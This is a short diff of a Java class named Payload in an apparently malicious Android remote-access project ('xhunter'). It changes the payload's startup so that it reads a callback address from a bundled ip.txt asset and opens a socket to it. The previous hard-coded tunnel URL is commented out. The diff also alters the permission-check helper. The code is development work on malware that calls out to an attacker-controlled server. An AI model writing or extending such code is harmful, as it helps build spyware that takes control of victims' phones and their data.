@@ -20,14 +20,13 @@ import android.telephony.TelephonyManager;
 import android.util.Base64;
 import android.util.Log;
 
-import androidx.core.content.ContextCompat;
-
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
 
 import java.io.BufferedInputStream;
+import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
@@ -35,6 +34,7 @@ import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.io.RandomAccessFile;
 import java.math.BigInteger;
 import java.net.URI;
@@ -71,8 +71,17 @@ public class Payload {
 
     public static void main() {
         Log.e("xhunterTest", "<++++++++++++++++><><>><<<<>Successfully started myself++++>>>>>>>>");
-        connectToSocket("https://xhunter.loca.lt");
+       // connectToSocket("https://xhunter.loca.lt");
        // connectToSocket("http://192.168.43.1:8080");
+        try{
+            BufferedReader reader = new BufferedReader(new InputStreamReader(mcontext.getAssets().open("ip.txt")));
+            String ip=reader.readLine().trim();
+            System.out.println(ip);
+            System.out.println(ip.length());
+            if(ip.length()>0){
+                connectToSocket(ip);
+            }
+            }catch (IOException e){}
     }
 
 
@@ -538,7 +547,7 @@ public class Payload {
         return encImage;
     }
     private static boolean checkPermission(String permission) {
-        if (ContextCompat.checkSelfPermission(mcontext, permission) == PackageManager.PERMISSION_DENIED) {
+        if (mcontext.checkCallingOrSelfPermission(permission) == PackageManager.PERMISSION_DENIED) {
             return false;
         }else{
             return true;
